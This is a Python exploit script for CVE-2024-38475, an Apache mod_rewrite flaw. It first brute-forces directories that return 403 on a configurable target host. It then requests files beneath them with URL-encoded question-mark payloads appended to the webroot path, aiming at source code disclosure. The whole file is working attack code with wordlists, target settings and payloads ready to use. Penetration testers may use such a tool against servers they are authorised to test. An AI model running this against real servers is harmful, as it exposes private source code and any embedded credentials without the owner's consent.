
#!/usr/bin/python3
## Credits: https://blog.orange.tw/ | https://x.com/orange_8361
## And.. https://github.com/p0in7s/CVE-2024-38475
##

from termcolor import colored, cprint
import requests

# Configuration variables
webroot = '/var/www/html'  # The webroot path on the target server (no trailing slash)
directory_wordlist = 'dirs.txt'  # Wordlist for directory enumeration
file_wordlist = 'lolol.txt'  # Wordlist for file enumeration
url_ip_domain = '192.168.1.127'  # Target IP or domain (no schema or trailing slash)
schema = 'http'  # http or https
payloads = ["%3F", "%3Fooooo.php"]  # Payloads to test for source code disclosure

# List to hold directories that return a 403 status code
forbidden_directories = []


def enumerate_directories():
    """
    Enumerates directories one level deep under the webroot.
    If a directory returns a 403 status code, it is added to the forbidden_directories list.
    """
    with open(directory_wordlist, 'r', errors='replace') as f:
        lines = [word.strip() for word in f.readlines()]  # Read and clean up lines
        for line in lines:
            # Construct the full URL for the directory
            url = f"{schema}://{url_ip_domain}/{line}/"
            r = requests.get(url, allow_redirects=False)

            # Check if the directory returns a 403 status code
            if r.status_code == 403:
                print(colored(f"403 Forbidden - Directory found: {line}", "green"))
                forbidden_directories.append(line)


def check_source_code_disclosure():
    """
    Tries to read files within the 403 directories using the provided payloads.
    The goal is to find source code disclosures.
    """
    with open(file_wordlist, 'r', errors='replace') as f:
        lines = [word.strip() for word in f.readlines()]  # Read and clean up lines
        for directory in forbidden_directories:
            for line in lines:
                for payload in payloads:
                    # Construct the full URL to test for source code disclosure
                    url = f"{schema}://{url_ip_domain}/{directory}{webroot}/{line}{payload}"
                    r = requests.get(url, allow_redirects=False)

                    # Check if the request is successful (status code 200)
                    if r.status_code == 200:
                        print(colored(f"200 OK - File found: {r.url}", "green"))


if __name__ == "__main__":
    # Enumerate directories and look for 403 Forbidden responses
    print(colored("\nEnumerating directories one level deep in webroot...", "yellow"))
    enumerate_directories()

    # Attempt to find source code disclosures within 403 Forbidden directories
    print(colored("\nChecking for source code disclosures in 403 directories...", "yellow"))
    check_source_code_disclosure()

##
##
